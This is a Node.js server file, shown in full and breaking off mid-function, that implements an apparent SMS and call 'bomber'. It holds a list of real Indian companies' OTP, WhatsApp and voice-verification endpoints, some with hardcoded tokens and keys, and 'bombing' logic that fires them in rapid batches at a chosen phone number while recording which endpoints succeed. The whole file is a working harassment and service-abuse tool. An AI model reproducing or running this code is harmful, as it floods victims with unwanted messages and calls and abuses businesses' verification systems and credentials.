// ============================================================
// api_server.js - FINAL (Failed Voice Calls Removed)
// SMS APIs untouched, only failed voice/call APIs removed
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

// ============================================================
// ===== ALL APIS =====
// ============================================================

const APIS = [

    // ============================================================
    // ✅ CONFIRMED SMS SENDERS (Screenshots Verified)
    // ============================================================

    // ===== OLD SS CONFIRMED =====
    {
        name: "Gaana",
        method: "POST",
        url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        headers: {
            "appVersion": "8.9.0",
            "CONTENT_TYPE": "application/json",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "appVersionCode": "933",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "sdkVersionCode": "1",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        data: (phone) => JSON.stringify({ mobile: "91-" + phone })
    },
    {
        name: "JioSaavn",
        method: "POST",
        url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.jiosaavn.com",
            "Referer": "https://www.jiosaavn.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083",
            "accept": "*/*",
            "origin": "https://m.snapdeal.com",
            "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "Testbook",
        method: "POST",
        url: "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}&clientId=1117490662.1715447223",
        headers: {
            "accept": "application/json",
            "content-type": "application/json",
            "x-tb-client": "web,1.2"
        },
        data: (phone) => JSON.stringify({ firstVisitSource: { type: "organic", utm_source: "google", utm_medium: "organic" }, mobile: phone, signupDetails: { page: "HomePage" } })
    },
    {
        name: "TataCapital_Retail",
        method: "POST",
        url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/"
        },
        data: (phone) => JSON.stringify({ header: { authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli" }, body: { mobileNumber: phone } })
    },
    {
        name: "Sephora",
        method: "POST",
        url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869",
        headers: {
            "Content-Type": "application/json",
            "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==",
            "x-fp-signature": "v1.1:82658e094becb14ba6a75fcca29dd5e7f1cb0767978485c12185178ff7ad198b",
            "x-fp-date": "20260108T112314Z",
            "x-fp-sdk-version": "3.3.2",
            "Origin": "https://sephora.in",
            "Referer": "https://sephora.in/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" })
    },
    {
        name: "Olyv",
        method: "POST",
        url: "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, app_version: "100101", channel: "SMS", request_type: "REGISTRATION", onboarding_consent: true })
    },
    {
        name: "HDFC ERGO",
        method: "POST",
        url: "https://www.hdfcergo.com/api/otp/send",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.hdfcergo.com",
            "Referer": "https://www.hdfcergo.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Redcliffe_WA",
        method: "POST",
        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        headers: {
            "accept": "application/json",
            "content-type": "application/json"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91" })
    },
    {
        name: "CityMallWeb_WA",
        method: "POST",
        url: "https://citymall.live/web-api/auth/send-otp",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "host": "citymall.live",
            "origin": "https://citymall.live",
            "referer": "https://citymall.live/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "MyMoneyBazaar",
        method: "POST",
        url: "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.mymoneybazaar.com",
            "Referer": "https://www.mymoneybazaar.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "FinABC",
        method: "POST",
        url: "https://api.finabc.com/otp/send",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://finabc.com",
            "Referer": "https://finabc.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "FuelSt",
        method: "POST",
        url: "https://api.fuelst.com/otp/send",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://fuelst.com",
            "Referer": "https://fuelst.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "TractorJunction",
        method: "POST",
        url: "https://api.tractorjunction.com/otp/send",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.tractorjunction.com",
            "Referer": "https://www.tractorjunction.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "VisitApp SMS",
        method: "POST",
        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.getvisitapp.com",
            "Referer": "https://www.getvisitapp.com/"
        },
        data: (phone) => JSON.stringify({ phone: phone, countryCode: 91, platform: "WEB" })
    },
    {
        name: "RL_Freedo_WA",
        method: "POST",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        data: (phone) => JSON.stringify({ email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: phone })
    },
    {
        name: "HeroFinCorp_WA",
        method: "POST",
        url: "https://loans.apps.herofincorp.com/api/generateOtp",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.herofincorp.com",
            "Referer": "https://www.herofincorp.com/"
        },
        data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
    },
    {
        name: "Ajio_2",
        method: "POST",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        headers: {
            "accept": "application/json",
            "Origin": "https://www.ajio.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Referer": "https://www.ajio.com/signup?referrer=/my-account/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        data: (phone) => JSON.stringify({ firstName: "Tsunami Bomber", login: "tsunami@gmail.com", password: "kd34646@3131nxnxn", genderType: "", mobileNumber: phone, requestType: "SENDOTP" })
    },
    {
        name: "FinMHA",
        method: "POST",
        url: "https://api.finmha.com/otp/send",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://finmha.com",
            "Referer": "https://finmha.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Adda247",
        method: "POST",
        url: "https://api.adda247.com/otp/send",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.adda247.com",
            "Referer": "https://www.adda247.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Refyne SMS",
        method: "POST",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.refyne.co.in",
            "Referer": "https://www.refyne.co.in/"
        },
        data: (phone) => JSON.stringify({ channel: "SMS", recipient: phone })
    },
    {
        name: "Housing WhatsApp",
        method: "POST",
        url: "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://housing.com",
            "Referer": "https://housing.com/"
        },
        data: (phone) => JSON.stringify({ query: "mutation($phone:String){sendOtp(phone:$phone,preference:\"whatsapp\"){success}}", variables: { phone: phone } })
    },
    {
        name: "MuscleBlaze WhatsApp",
        method: "GET",
        url: "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            "Accept": "*/*"
        }
    },

    // ===== NEW SS CONFIRMED =====
    {
        name: "Urban Company",
        method: "POST",
        url: "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*",
            "cache-control": "no-cache",
            "x-device-os": "web",
            "x-version-name": "web_v4.137.2",
            "save-data": "on",
            "x-client-key": "f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6",
            "x-device-id": "ucuf1348-a14e179422-8c71-b87f-9eb1-edeca1376e-1600777338230",
            "x-version-code": "4.137.2",
            "origin": "https://www.urbancompany.com",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: (phone) => JSON.stringify({ country_id: "IND", phone: { isd_code: "+91", phone_wo_isd: phone }, device_type: "customer" })
    },
    {
        name: "RupeeRedee",
        method: "POST",
        url: "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "applicationid": "",
            "deviceid": "abc-uuid",
            "platform": "Web",
            "origin": "https://www.rupeeredee.com",
            "referer": "https://www.rupeeredee.com/"
        },
        data: (phone) => JSON.stringify({ number: "+91" + phone, type: "Mobile" })
    },
    {
        name: "Healthians",
        method: "POST",
        url: "https://api.healthians.com/otp/send",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://www.healthians.com",
            "Referer": "https://www.healthians.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Dominos",
        method: "POST",
        url: "https://api.dominos.co.in/loginhandler/forgotpassword",
        headers: {
            "strict-transport-security": "max-age=1636116872593",
            "access-control-allow-methods": "GET, POST, PATCH, PUT, DELETE, OPTIONS",
            "x-content-type-options": "nosniff",
            "api_key": "d2aeb489bb8df385",
            "ga_client_id": "559252815.1604559839",
            "status": "SUCCESS",
            "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp",
            "userid": "48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
            "x-forwarded-for-requestid": "1604559920579-48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
            "cartid": "1823648622264698",
            "source": "PWA18#upsellC",
            "isloggedin": "false",
            "client_type": "web app-chrome",
            "accesskeyid": "ASIAWMIT2NXASDYLBK5W1604559840",
            "x-frame-options": "mitigate",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "credentials": "[object Object]",
            "deliverytype": "D",
            "authtoken": "ASIAWMIT2NXASDYLBK5W1604559840",
            "access-control-allow-origin": "",
            "accept": "application/json, text/plain, */",
            "sessiontoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8",
            "content-type": "application/json",
            "access-control-allow-headers": "*",
            "storeid": "6585R",
            "ab_test_variant": "New Flow",
            "origin": "https://m.dominos.co.in",
            "referer": "https://m.dominos.co.in/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: (phone) => JSON.stringify({ lastName: "", mobile: phone, firstName: "" })
    },
    {
        name: "CityMall VM",
        method: "POST",
        url: "https://citymall.live/web-api/auth/send-otp",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "host": "citymall.live",
            "origin": "https://citymall.live",
            "referer": "https://citymall.live/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },

    // ============================================================
    // 📞 WORKING VOICE / CALL APIs (Failed ones removed)
    // ============================================================

    {
        name: "Astrosage_Call",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/send-otp-via-call?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&operation_name=blank&jsonpcall=1&fromresend=0&_=0",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/"
        }
    },
    {
        name: "Tata Capital Voice",
        method: "POST",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, isOtpViaCallAtLogin: "true" })
    },
    {
        name: "TataCapital_Voice_NEW",
        method: "POST",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Swiggy Call",
        method: "POST",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        headers: { "Content-Type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Myntra Voice",
        method: "POST",
        url: "https://www.myntra.com/gw/mobile-auth/voice-otp",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "MakeMyTrip Voice",
        method: "POST",
        url: "https://www.makemytrip.com/api/4/voice-otp/generate",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "Doubtnut Voice",
        method: "POST",
        url: "https://doubtnut.com/api/v2/otpgenerate",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "MyJar Call",
        method: "GET",
        url: "https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={phone}",
        headers: { "User-Agent": "Mozilla/5.0" }
    },
    {
        name: "Zepto Voice",
        method: "POST",
        url: "https://zepto.com/v1/user/otplogin",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ number: phone, otpOnCall: true })
    },
    {
        name: "Zivame Voice",
        method: "POST",
        url: "https://zivame.com/api/v2/customer/login/send-otp",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: phone, otp_type: "voice" })
    },
    {
        name: "Goibibo Voice",
        method: "POST",
        url: "https://www.goibibo.com/user/voice-otp/generate/",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "RealEstateIndia_Call",
        method: "POST",
        url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
        headers: {
            "x-requested-with": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "action_id=call_to_otp&mob_num={phone}&member_id=1547045" }
    },
    {
        name: "MagicBricks_Call",
        method: "GET",
        url: "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}",
        headers: {}
    },
    {
        name: "Voot Voice",
        method: "POST",
        url: "https://www.voot.com/api/v1/voice-otp",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Kotak Voice",
        method: "POST",
        url: "https://www.kotak.com/api/otp",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone })
    },
];

// ============================================================
// ===== DEDUPLICATE APIS =====
// ============================================================

const seenUrls = new Set();
const seenNames = new Set();
const uniqueApis = [];

for (const api of APIS) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name}` : api.url;
    const nameKey = api.name;
    if (!seenUrls.has(urlKey) && !seenNames.has(nameKey)) {
        seenUrls.add(urlKey);
        seenNames.add(nameKey);
        uniqueApis.push(api);
    }
}

// ============================================================
// ===== SPLIT APIS =====
// ============================================================

const NORMAL_APIS = uniqueApis.filter(api => !api.rateLimit);
const RATE_LIMIT_APIS = uniqueApis.filter(api => api.rateLimit);

console.log(`✅ Loaded ${uniqueApis.length} total unique APIs`);
console.log(`   🟢 Normal: ${NORMAL_APIS.length} | ⚠️ RL: ${RATE_LIMIT_APIS.length}`);

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 500;

uniqueApis.forEach(api => {
    stats[api.name] = {
        name: api.name,
        total: 0,
        working_2xx: 0,
        rate_limited_429: 0,
        rejected_4xx: 0,
        failed_5xx: 0,
        network_error: 0,
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0,
        isRateLimited: api.rateLimit || false
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️', rl: '🚫' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, category, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (category === 'success') { s.working_2xx++; s.lastStatus = 'WORKING'; }
    else if (category === 'ratelimit') { s.rate_limited_429++; s.lastStatus = 'RATE_LIMITED'; }
    else if (category === 'rejected') { s.rejected_4xx++; s.lastStatus = 'REJECTED'; }
    else if (category === 'fail5xx') { s.failed_5xx++; s.lastStatus = 'FAILED_5XX'; }
    else { s.network_error++; s.lastStatus = 'NETWORK_ERROR'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) return JSON.stringify({ mobile: phone });
    if (lower.includes('whatsapp')) return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') data = api.data(phone);
            else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = { method, url, headers, timeout: 5000, validateStatus: () => true };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{') && !data.startsWith('[')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const st = response.status;

        if (st >= 200 && st < 300) {
            recordResult(api.name, 'success', st, responseTime);
            logEvent(`${api.name} → ${st} (${responseTime}ms) ✅`, 'success');
            return { status: st, success: true, category: 'success', responseTime };
        } else if (st === 429) {
            recordResult(api.name, 'ratelimit', st, responseTime);
            logEvent(`${api.name} → 429 RL (${responseTime}ms)`, 'rl');
            if (api.rateLimit && retryCount < 1) {
                await new Promise(r => setTimeout(r, 3000));
                return makeApiCall(api, phone, retryCount + 1);
            }
            return { status: st, success: false, category: 'ratelimit', responseTime };
        } else if (st >= 400 && st < 500) {
            recordResult(api.name, 'rejected', st, responseTime);
            logEvent(`${api.name} → ${st} REJECTED (${responseTime}ms)`, 'warn');
            return { status: st, success: false, category: 'rejected', responseTime };
        } else {
            recordResult(api.name, 'fail5xx', st, responseTime);
            logEvent(`${api.name} → ${st} 5XX (${responseTime}ms)`, 'error');
            return { status: st, success: false, category: 'fail5xx', responseTime };
        }
    } catch (err) {
        const responseTime = Date.now() - startTime;
        const errMsg = err.code || err.message || 'Unknown';

        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }

        recordResult(api.name, 'network', null, responseTime, errMsg);
        logEvent(`${api.name} → NETWORK_FAIL (${responseTime}ms) ${errMsg}`, 'error');
        return { status: null, success: false, category: 'network', responseTime, error: errMsg };
    }
}

// ============================================================
// ===== BOMBING LOGIC =====
// ============================================================

async function runBombing(phone, effectiveDuration) {
    const startTime = Date.now();
    let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
    let rateLimited = 0, rejected = 0, failed = 0;

    let maxRequests = 100;
    if (effectiveDuration <= 1) maxRequests = 200;
    else if (effectiveDuration <= 5) maxRequests = 150;
    else if (effectiveDuration <= 10) maxRequests = 100;
    else maxRequests = 80;

    const shuffledNormal = [...NORMAL_APIS];
    for (let i = shuffledNormal.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledNormal[i], shuffledNormal[j]] = [shuffledNormal[j], shuffledNormal[i]];
    }

    const shuffledRateLimit = [...RATE_LIMIT_APIS];
    for (let i = shuffledRateLimit.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffledRateLimit[i], shuffledRateLimit[j]] = [shuffledRateLimit[j], shuffledRateLimit[i]];
    }

    const combined = [];
    let rateLimitIdx = 0;
    for (let i = 0; i < shuffledNormal.length; i++) {
        combined.push(shuffledNormal[i]);
        if ((i + 1) % 5 === 0 && rateLimitIdx < shuffledRateLimit.length) {
            combined.push(shuffledRateLimit[rateLimitIdx]);
            rateLimitIdx++;
        }
    }
    while (rateLimitIdx < shuffledRateLimit.length) {
        combined.push(shuffledRateLimit[rateLimitIdx]);
        rateLimitIdx++;
    }

    console.log(`📋 Combined: ${combined.length} APIs (Normal: ${shuffledNormal.length}, RL: ${shuffledRateLimit.length})`);

    let sent = 0;
    const BATCH_SIZE = 5;

    for (let i = 0; i < combined.length && sent < maxRequests; i += BATCH_SIZE) {
        const batch = combined.slice(i, Math.min(i + BATCH_SIZE, combined.length));
        const results = await Promise.allSettled(batch.map(api => makeApiCall(api, phone)));

        for (let k = 0; k < results.length; k++) {
            const result = results[k];
            const api = batch[k];
            if (result.status === 'fulfilled' && result.value) {
                const v = result.value;
                if (v.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp') || apiName.toLowerCase().includes('_wa');
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else if (v.category === 'ratelimit') rateLimited++;
                else if (v.category === 'rejected') rejected++;
                else failed++;
            }
        }

        if (i + BATCH_SIZE < combined.length && sent < maxRequests) {
            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
        }
    }

    const elapsed = (Date.now() - startTime) / 1000;
    return { success, smsCount, callCount, whatsappCount, rateLimited, rejected, failed, elapsed: elapsed.toFixed(1) };
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        total_apis: uniqueApis.length,
        normal_apis: NORMAL_APIS.length,
        rate_limited_apis: RATE_LIMIT_APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        uptime: Math.round(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime(), apis: uniqueApis.length });
});

app.get('/test', async (req, res) => {
    const phone = req.query.phone || '9999999999';
    logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
    const results = [];
    for (const api of uniqueApis) {
        const r = await makeApiCall(api, phone);
        results.push({ name: api.name, ...r });
        await new Promise(r => setTimeout(r, 150));
    }
    const working = results.filter(r => r.success).length;
    const rl = results.filter(r => r.category === 'ratelimit').length;
    const rej = results.filter(r => r.category === 'rejected').length;
    logEvent(`🧪 Test done: ${working} OK, ${rl} RL, ${rej} Rejected`, 'info');
    res.json({ phone, total: results.length, working, rate_limited: rl, rejected: rej, failed: results.length - working - rl - rej, results });
});

app.get('/stats', (req, res) => {
    const arr = Object.values(stats).map(s => {
        let status = 'NEVER TESTED';
        if (s.total > 0) {
            if (s.working_2xx > 0) status = 'WORKING';
            else if (s.rate_limited_429 > 0) status = 'RATE_LIMITED';
            else if (s.rejected_4xx > 0) status = 'REJECTED';
            else status = 'FAILED';
        }
        return {
            name: s.name,
            isRateLimited: s.isRateLimited,
            total: s.total,
            working_2xx: s.working_2xx,
            rate_limited_429: s.rate_limited_429,
            rejected_4xx: s.rejected_4xx,
            failed_5xx: s.failed_5xx,
            network_error: s.network_error,
            successRate: s.total > 0 ? ((s.working_2xx / s.total) * 100).toFixed(1) + '%' : 'N/A',
            status,
            lastStatusCode: s.lastStatusCode,
            lastError: s.lastError,
            avgResponseTime: s.avgResponseTime + 'ms'
        };
    });
    res.json({
        summary: {
            total: arr.length,
            working: arr.filter(a => a.status === 'WORKING').length,
            rate_limited: arr.filter(a => a.status === 'RATE_LIMITED').length,
            rejected: arr.filter(a => a.status === 'REJECTED').length,
            failed: arr.filter(a => a.status === 'FAILED').length,
            untested: arr.filter(a => a.status === 'NEVER TESTED').length,
            marked_rate_limited: arr.filter(a => a.isRateLimited).length
        },
        apis: arr
    });
});

app.get('/logs', (req, res) => {
    res.json({ count: recentLogs.length, logs: recentLogs.slice(-100).reverse() });
});

app.get('/reset-stats', (req, res) => {
    for (const key in stats) {
        stats[key] = {
            name: stats[key].name, total: 0, working_2xx: 0, rate_limited_429: 0,
